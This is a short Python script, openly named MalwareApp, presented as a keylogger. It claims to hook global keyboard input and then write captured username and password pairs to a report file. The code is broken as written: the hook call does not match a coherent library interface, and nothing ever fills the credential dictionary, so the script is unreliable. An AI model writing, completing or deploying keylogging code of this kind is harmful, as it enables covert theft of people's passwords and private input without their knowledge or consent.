import pyhook3

class MalwareApp:
    def __init__(self):
        self.username_password_pairs = {}

    def start(self):
        # Start capturing keyboard activity
        pyhook3.install_hook({'GlobalHook': 'mylog.txt'})

    def compile_report(self):
        with open('report.txt', 'w') as file:
            for username, password in self.username_password_pairs.items():
                file.write(f'{username}: {password}\n')

if __name__ == '__main__':
    malware_app = MalwareApp()
    malware_app.start()

    # Give the script time to capture keystrokes
    import time
    time.sleep(60)

    malware_app.compile_report()

